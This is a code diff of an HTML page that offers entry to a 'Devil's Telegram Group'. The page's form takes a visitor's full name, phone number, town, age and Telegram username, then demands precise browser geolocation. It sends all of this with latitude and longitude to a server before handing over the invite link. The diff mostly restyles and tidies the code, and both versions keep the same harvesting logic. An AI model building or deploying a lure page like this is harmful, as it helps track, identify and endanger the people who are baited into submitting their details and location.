@@ -1,15 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Join Devil's Telegram Group</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
       margin: 0;
       padding: 0;
-      height: 100%;
-      overflow: hidden;
       font-family: 'Segoe UI', sans-serif;
       background: linear-gradient(135deg, #5f2c82, #49a09d);
       color: white;
@@ -17,15 +15,16 @@
       align-items: center;
       justify-content: center;
       flex-direction: column;
-      transition: background 0.2s;
+      min-height: 100vh;
     }
 
     h2 {
-      font-size: 2rem;
+      font-size: 1.8rem;
       margin-bottom: 1rem;
-      animation: typing 3s steps(22), blink 0.5s step-end infinite alternate;
+      text-align: center;
       white-space: nowrap;
       overflow: hidden;
+      animation: typing 3s steps(22), blink 0.5s step-end infinite alternate;
       border-right: 3px solid white;
     }
 
@@ -49,15 +48,13 @@
       max-width: 400px;
     }
 
-    input {
+    input, button {
       width: 100%;
       padding: 12px;
       margin: 10px 0;
       border: none;
       border-radius: 8px;
       font-size: 1rem;
-      outline: none;
-      transition: 0.3s;
     }
 
     input:focus {
@@ -69,13 +66,8 @@
     button {
       background: #ffffff;
       color: #333;
-      padding: 12px 20px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
       font-weight: bold;
-      width: 100%;
-      transition: transform 0.2s, box-shadow 0.3s;
+      transition: 0.3s;
     }
 
     button:hover {
@@ -85,72 +77,61 @@
   </style>
 </head>
 <body>
-  <h2>Fill The Form To Join Devil's Group</h2>
-  <form id="userForm">
-    <input type="text" name="fullname" placeholder="Full Name" required />
-    <input type="text" name="phone" placeholder="Phone Number" required />
-    <input type="text" name="towncity" placeholder="Town/City" required />
-    <input type="number" name="age" placeholder="Age" required />
-    <input type="text" name="telegram" placeholder="Telegram Username" required />
-    <button type="submit">Submit</button>
-  </form>
 
-  <script>
-    document.addEventListener("mousemove", (e) => {
-      const x = e.clientX / window.innerWidth;
-      const y = e.clientY / window.innerHeight;
-      document.body.style.background = 'linear-gradient(${(x + y) * 180}deg, #5f2c82, #49a09d)';
-    });
+<h2>Fill the form to join</h2>
 
-    document.getElementById("userForm").addEventListener("submit", function (e) {
-      e.preventDefault();
+<form id="userForm">
+  <input type="text" name="fullname" placeholder="Full Name" required>
+  <input type="text" name="phone" placeholder="Phone Number" required>
+  <input type="text" name="towncity" placeholder="Town/City" required>
+  <input type="number" name="age" placeholder="Age" required>
+  <input type="text" name="telegram" placeholder="Telegram Username" required>
+  <button type="submit">Submit</button>
+</form>
 
-      console.log("Submitting form...");
+<script>
+document.getElementById("userForm").addEventListener("submit", function (e) {
+  e.preventDefault();
+  const form = e.target;
 
-      if (!navigator.geolocation) {
-        alert("Geolocation not supported");
-        return;
+  if (!navigator.geolocation) {
+    alert("Geolocation not supported.");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(sendData, () => {
+    alert("Failed to gain the trust.");
+  }, { enableHighAccuracy: true, timeout: 10000 });
+
+  function sendData(position) {
+    const { latitude, longitude } = position.coords;
+    const data = {
+      fullname: form.fullname.value.trim(),
+      phone: form.phone.value.trim(),
+      towncity: form.towncity.value.trim(),
+      age: form.age.value.trim(),
+      telegram: form.telegram.value.trim(),
+      latitude,
+      longitude
+    };
+
+    fetch("/submit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    })
+    .then(res => res.json())
+    .then(response => {
+      if (response.link) {
+        window.location.href = response.link;
+      } else {
+        alert(response.error || "Something went wrong.");
       }
+    })
+    .catch(() => alert("Network error"));
+  }
+});
+</script>
 
-      navigator.geolocation.getCurrentPosition(success, error);
-
-      function success(position) {
-        console.log("Location received", position.coords);
-
-        const form = e.target;
-        const data = {
-          fullname: form.fullname.value.trim(),
-          phone: form.phone.value.trim(),
-          towncity: form.towncity.value.trim(),
-          age: form.age.value.trim(),
-          telegram: form.telegram.value.trim(),
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude
-        };
-
-        fetch("/submit", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        })
-          .then(res => res.json())
-          .then(response => {
-            if (response.link) {
-              window.location.href = response.link;
-            } else {
-              alert(response.error || "Something went wrong.");
-            }
-          })
-          .catch(err => {
-            console.error("Network error:", err);
-            alert("Network error. Try again.");
-          });
-      }
-
-      function error() {
-        alert("Failed to gain the trust");
-      }
-    });
-  </script>
 </body>
 </html>
